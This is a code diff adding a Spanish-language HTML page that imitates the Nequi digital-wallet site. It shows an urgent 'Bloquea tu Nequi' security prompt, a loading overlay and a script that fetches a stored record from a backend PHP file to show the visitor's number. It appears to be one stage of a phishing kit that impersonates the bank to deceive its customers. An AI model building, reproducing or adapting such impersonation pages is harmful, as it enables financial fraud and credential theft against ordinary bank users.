@@ -1,0 +1,174 @@
+<html>
+    <head>
+        <title>Bienvenido</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="shortcut icon" type="image/x-icon" href="../assets/img/favicon.ico">
+        <script type="text/javascript" src="../assets/js/jquery-3.6.0.min.js"></script>      
+        <link href="../assets/css/styles.css" rel="stylesheet">
+        <link href="../assets/css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="../assets/js/functions.js?v2"></script>  
+        <style type="text/css">
+            #fondo{
+                position: fixed;
+                width: 100%;
+                height: 100%;
+                top: 0;
+                left: 0;
+                background-color: #ffffffc4;
+                z-index: 300;
+            }
+            #cargando{
+                position: fixed;            
+                top:50%; 
+                left:50%;
+                transform: translate(-50%, -50%);
+                z-index: 400;
+            }
+        </style> 
+    </head>
+    <body>        
+        <div id="fondo"></div>
+        <img src="../assets/img/cargando.gif" id="cargando"> 
+       <div class="cabecera">
+           <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
+                    <td valign="middle" align="right">
+                        <button class="btn btn-std btn-sprd top-btn">Recarga</button>
+                        <button class="btn btn-std btn-sprd top-btn">Salir</button>
+                        <img src="../assets/img/menu.jpg" id="btn-menu">
+                    </td>
+                </tr>               
+           </table>
+           <div class="bar-menu">
+               <span class="menu-interno marcado">Mi Nequi</span>
+               <span class="menu-interno">Certificados</span>
+               <span class="menu-interno">Ayuda</span>
+           </div>
+       </div>
+        <div class="contenido-interno">
+            <table cellpadding="0" cellpadding="0" border="0" id="tbl-bienvenido">
+                <tr>
+                    <td id="td-perfil" align="center" valign="top">
+                        <div class="panel">
+                            <img src="../assets/img/foto.svg" width="48">
+                            <div id="numero"></div>
+                            <img src="../assets/img/ajuste.svg" width="24">
+                        </div>
+                    </td>
+                    <td id="td-bloqueo" align="center" valign="top">
+                        <div class="panel">
+                            <img src="../assets/img/fuego.svg" width="46"><span style="font-size: 1.125em;color:#210049;font-weight: 600;line-height: 1.1;">¡Urgente!</span>
+                            <div style="width:80%;font-size: .9em;color: #7c8a96;margin-top: 20px;">Eres lo más importante para nosotr@s y queremos que tu plata siempre esté segura en Nequi.</div>
+                            <div style="border-bottom: 1px dashed #7c8a969e;margin-top: 34px;margin-bottom: 27px;"></div>
+                            <div style="font-size: 1em;color: #210049;margin-bottom: 21px;">Cuéntanos qué necesitas hacer:</div>
+                            <button class="btn-small btn-fill">Bloquea tu Nequi</button>
+                        </div>
+                        <div class="ultima-visita">La última vez que usaste la App Nequi fue el 05 de Agosto a las 01:02 am</div>
+                    </td>
+                </tr>
+            </table>
+            <div class="panel" id="pnl-bloqueo">
+                <img src="../assets/img/fuego.svg" width="46"><span style="font-size: 1.125em;color:#210049;font-weight: 600;line-height: 1.1;">¡Urgente!</span>
+                <div style="width:80%;font-size: .9em;color: #7c8a96;margin: 20 auto;">Eres lo más importante para nosotr@s y queremos que tu plata siempre esté segura en Nequi.</div>
+                <div style="border-bottom: 1px dashed #7c8a969e;margin-top: 34px;margin-bottom: 27px;"></div>
+                <div style="font-size: 1em;color: #210049;margin-bottom: 21px;">Cuéntanos qué necesitas hacer:</div>
+                <button class="btn-small btn-fill">Bloquea tu Nequi</button>
+            </div>
+       </div>
+       <div class="pie">
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
+                <tr>
+                    <td id="logo-blanco-movil">
+                        <img src="../assets/img/logo-blanco.svg" width="176" style="margin-bottom: 27px;" >
+                        <div class="separador"></div>
+                    </td>
+                </tr>
+            </table>
+
+           
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                
+                <tr>
+                    <td valign="top" id="logo-blanco">
+                        <img src="../assets/img/logo-blanco.svg" width="176">
+                    </td>
+                    <td valign="top">
+                        <div class="titulo-footer">Producto</div>
+                        <div class="item-footer">Legales</div>
+                        <div class="item-footer">Ayuda</div>
+
+                        <div class="titulo-footer vmovil">Portales</div>
+                        <div class="item-footer vmovil">Blog | Metidas de plata</div>
+                        <div class="item-footer vmovil">APIs | Nequi conecta</div>
+
+                        <div class="titulo-footer vmovil">Redes</div>
+                        <img class="vmovil" src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+
+                    </td>
+                    <td valign="top" id="app">
+                        <div class="titulo-footer">Descarga la App</div>
+                        <img src="../assets/img/icon-app.jpg" style="margin-top: 10px;">
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Portales</div>
+                        <div class="item-footer">Blog | Metidas de plata</div>
+                        <div class="item-footer">APIs | Nequi conecta</div>
+                    </td>
+                    <td valign="top" class="mmovil">
+                        <div class="titulo-footer">Redes</div>
+                        <img src="../assets/img/icon-social.jpg" style="margin-top: 10px;">
+                    </td>
+                </tr>                
+            </table>
+
+            
+
+            <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">                                
+                <tr>
+                    <td id="gb-sec">
+                        <div class="separador"></div>                    
+                        <img src="../assets/img/gb-blanco.svg" width="122"  style="margin-bottom: 15px;">
+                        <div style="border-bottom: 1px solid red; width:100%;"></div>
+                    </td>
+                </tr>
+                <tr>
+                    <td valign="middle" align="center">
+                        <table border="0" cellpadding="0" cellspacing="0" >
+                            <tr>
+                                <td id="copy-menu">
+                                    <div class="item-copy">Características del producto</div>
+                                    <div class="item-copy">Condiciones de uso</div>
+                                    <div class="item-copy">Legales</div>
+                                    <div class="item-copy">Términos y condiciones</div>
+                                </td>    
+                            </tr>                            
+                        </table>                        
+                    </td>
+                </tr>
+            </table>
+
+       </div> 
+    </body>
+    <script type="text/javascript">
+        $(document).ready(function($){
+            
+            setTimeout(esperando,2500)
+            
+            $.post( "../process/buscar_registro.php", function(data) {                 
+                valor = data.split("|");
+                $("#numero").html(valor[1]);                
+            });
+        });  
+    </script>
+    <script type="text/javascript" src="../assets/js/ready.js?v2"></script> 
+</html>
